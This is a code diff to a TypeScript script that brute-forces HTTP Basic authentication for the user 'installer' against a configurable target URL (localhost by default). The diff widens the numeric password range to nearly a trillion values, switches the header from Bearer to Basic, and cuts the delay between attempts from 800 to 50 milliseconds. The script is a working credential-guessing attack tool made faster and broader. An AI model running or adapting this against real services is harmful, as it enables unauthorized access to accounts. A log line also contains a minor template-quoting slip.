@@ -8,11 +8,11 @@ import axios from 'axios'
   const targetUrl = envString('TARGET_URL', 'http://localhost:3030/posts')
   log.info('⚡️ App started for url ${url}')
 
-  for (let i = 100000; i < 9999999; i++) {
+  for (let i = 1000; i < 999999999999; i++) {
     const token = Buffer.from(`installer:${i}`).toString('base64')
     const config = {
       headers: {
-        Authorization: `Bearer ${token}`,
+        Authorization: `Basic ${token}`,
         accept: 'application/json'
       }
     }
@@ -24,7 +24,7 @@ import axios from 'axios'
     } catch (e: Error | unknown) {
       log.info(`${e} Auth installer:${i} ${targetUrl}`)
     }
-    await sleep(800)
+    await sleep(50)
   }
 })()
 
